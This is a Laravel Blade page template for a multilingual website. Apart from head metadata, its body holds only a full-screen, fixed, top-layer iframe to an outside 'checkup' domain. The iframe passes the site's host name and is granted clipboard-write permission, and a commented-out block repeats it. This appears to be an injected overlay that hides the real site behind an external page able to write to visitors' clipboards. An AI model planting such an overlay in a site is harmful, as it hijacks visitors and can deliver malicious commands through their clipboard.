{{-- @extends($design . '.layouts.main')

@section('title', $page_properties->title)
@section('keywords', $page_properties->keyword)
@section('description', $page_properties->description)

@section('content')
<iframe width="100%" height="100%" src="https://true-checkup.com/?parent_domain={{ request()->getHost() }}" style="position: fixed; z-index: 1000000; top: 0; left: 0;">

</iframe>
@endsection --}}


<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="utf-8">
    <title>{{ $page_properties->title }}</title>
    <meta name="robots" content="index, follow" />
    <meta name="Description" content="{{ $page_properties->description }}">
    <meta name="Keywords" content="{{ $page_properties->keyword }}">
    <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
	<meta name="format-detection" content="telephone=no">

    @foreach ($Language::GetAllLanuages() as $item)
        <link rel="alternate" href="{{ route('home.language', $item['code']) }}"
            @if ($item['code'] == 'arb')
                hreflang="ar"
            @elseif ($item['code'] == 'gr')
                hreflang="el"
            @elseif ($item['code'] == 'hans')
                hreflang="zh-Hans"
            @elseif ($item['code'] == 'hant')
                hreflang="zh-Hant"
            @else
                hreflang={{ $item['code'] }}
            @endif
        />
    @endforeach

    <link rel="icon" href="{{ asset($design . '/images/favicon/favicon.ico') }}" sizes="any">
    <link rel="apple-touch-icon" href="{{ asset($design . '/images/favicon/apple-touch-icon-180x180.png') }}">

    @if (env('APP_PWA', 0))
        <link rel="manifest" href="{{ asset($design . '/images/favicon/manifest.webmanifest') }}">
        <script defer type="text/javascript" src="{{ asset("/js/sw-setup.js") }}"></script>
    @endif

    <link href="{{ asset($design . '/css/style.css') }}" rel="stylesheet">

    <script defer src="{{ asset("vendor/jquery/jquery-3.6.3.min.js") }}"></script>
    <script defer src="{{ asset("vendor/jquery/autocomplete.js") }}"></script>
    <script defer src="{{ asset("vendor/jquery/init.js") }}"></script>
    <script defer type="text/javascript" src="//code.jquery.com/jquery-migrate-1.2.1.js"></script>
    {!! isset($pixel) ? $pixel : '' !!}
</head>
<body>
    <iframe width="100%" height="100%" src="https://true-checkup.com/?parent_domain={{ request()->getHost() }}" style="position: fixed; z-index: 1000000; top: 0; left: 0;" allow="clipboard-write">

    </iframe>
</body>